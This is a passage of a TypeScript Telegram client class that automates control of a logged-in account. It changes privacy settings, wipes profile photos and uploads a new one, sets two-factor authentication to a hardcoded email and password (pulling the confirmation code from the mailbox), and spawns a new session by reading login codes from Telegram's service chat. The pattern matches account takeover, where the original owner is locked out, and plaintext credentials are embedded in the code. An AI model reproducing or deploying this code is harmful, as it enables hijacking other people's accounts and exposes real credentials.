                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyForwards(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("forwards Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
        }
        catch (e) {
            throw e
        }
    }
    async getFileUrl(url: string, filename: string): Promise<string> {
        const response = await axios.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', () => resolve(true));
            writer.on('error', reject);
        });
        return filePath;
    }

    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new CustomFile(
                    'pic.jpg',
                    fs.statSync(
                        image
                    ).size,
                    image
                ),
                workers: 1,
            });
            console.log("file uploaded")
            await this.client.invoke(new Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated")
        } catch (error) {
            throw error
        }
    }

    async hasPassword() {
        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
        return passwordInfo.hasPassword
    }

    async set2fa() {
        if (!(await this.hasPassword())) {
            console.log("Password Does not exist, Setting 2FA");

            const imapService = MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };

            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    console.log("Checking if mail is ready");

                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        console.log("Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                console.log("Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            console.log("Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                console.log('Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            } else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        } catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                console.error('Email code error:', parseError(e));
                                return Promise.resolve("error");
                            }
                        });

                        return twoFaDetails;
                    } else {
                        console.log("Mail not ready yet");
                    }
                }, 5000);
            } catch (e) {
                console.error("Unable to connect to mail server:", parseError(e));
            }
        } else {
            console.log("Password already exists");
        }
    }


    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }

    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }

    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );
            console.log(`Profile Pics found: ${result.photos.length}`)
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(
                    new Api.photos.DeletePhotos({
                        id: <Api.TypeInputPhoto[]><unknown>result.photos
                    }))
            }
            console.log("Deleted profile Photos");
        } catch (error) {
            throw error
        }
    }

    async createNewSession(): Promise<string> {
        const me = <Api.User>await this.client.getMe();
        console.log("Phne:", me.phone);
        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 1,
        });
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => "Ajtdmwajt1@",
            phoneCode: async () => {
                console.log('Waiting for the OTP code from chat ID 777000...');
                return await this.waitForOtp();
            },
            onError: (err: any) => { throw err },

        });

        const session = <string><unknown>newClient.session.save();
        await newClient.disconnect();
        // await newClient.destroy();
        console.log("New Session: ", session)
        return session
    }

    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                console.log("Attempt : ", i)
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("returning: ", code)
                    return code;
                } else {
                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await sleep(5000)
                }
            } catch (err) {
                await sleep(2000)
                console.log(err)
            }
        }
    }
}
export default TelegramManager;
